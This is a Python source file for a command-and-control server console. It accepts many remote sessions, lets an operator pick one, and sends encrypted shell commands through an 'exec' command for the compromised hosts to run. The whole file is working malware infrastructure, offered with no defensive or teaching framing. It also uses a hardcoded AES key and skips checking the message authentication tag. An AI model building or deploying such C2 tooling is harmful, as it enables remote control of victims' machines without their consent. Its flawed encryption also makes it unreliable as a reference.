import socket
import threading
import json
import base64
from Crypto.Cipher import AES
import os

class C2Console:
    def __init__(self, host='0.0.0.0', port=8888):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(100)
        self.sessions = {}
        self.session_id = 0
        self.encryption_key = b'0123456789abcdef'  # 16字节AES密钥

    def encrypt(self, message):
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(message.encode())
        return base64.b64encode(nonce + ciphertext).decode()

    def decrypt(self, ciphertext):
        if not ciphertext:
            return ""
        raw_data = base64.b64decode(ciphertext)
        nonce = raw_data[:16]
        cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce=nonce)
        plaintext = cipher.decrypt(raw_data[16:])
        return plaintext.decode()

    def handle_client(self, client_socket, session_id):
        self.sessions[session_id] = client_socket
        print(f"Session {session_id} connected")
        while True:
            try:
                message = client_socket.recv(4096).decode()
                if not message:
                    continue
                result = self.decrypt(message)
                if result:
                    print(f"Received from session {session_id}: {result}")
            except Exception as e:
                print(f"Error in session {session_id}: {e}")
                client_socket.close()
                del self.sessions[session_id]
                break

    def run(self):
        print("C2 Console running...")
        while True:
            try:
                client_socket, addr = self.server.accept()
                self.session_id += 1
                session_id = self.session_id
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket, session_id))
                client_handler.start()
            except Exception as e:
                print(f"Error accepting connection: {e}")

    def console(self):
        self.current_session = None
        while True:
            try:
                command = input("C2> ")
                if command == "sessions":
                    for session_id, client_socket in self.sessions.items():
                        print(f"Session {session_id} connected")
                elif command.startswith("set session"):
                    _, _, session_id = command.split()
                    session_id = int(session_id)
                    if session_id in self.sessions:
                        self.current_session = session_id
                        print(f"Session {session_id} selected")
                    else:
                        print(f"Session {session_id} not found")
                elif command.startswith("exec"):
                    _, system_command = command.split(maxsplit=1)
                    if self.current_session:
                        session_id = self.current_session
                        client_socket = self.sessions[session_id]
                        encrypted_command = self.encrypt(system_command)
                        client_socket.send(encrypted_command.encode())
                        print(f"Command sent to session {session_id}")
                    else:
                        print("No session selected")
                elif command == "exit":
                    if self.current_session:
                        print(f"Exiting session {self.current_session}")
                        self.current_session = None
                    else:
                        print("No session selected")
            except Exception as e:
                print(f"Error in console: {e}")

if __name__ == "__main__":
    c2_console = C2Console()
    threading.Thread(target=c2_console.run).start()
    c2_console.console()
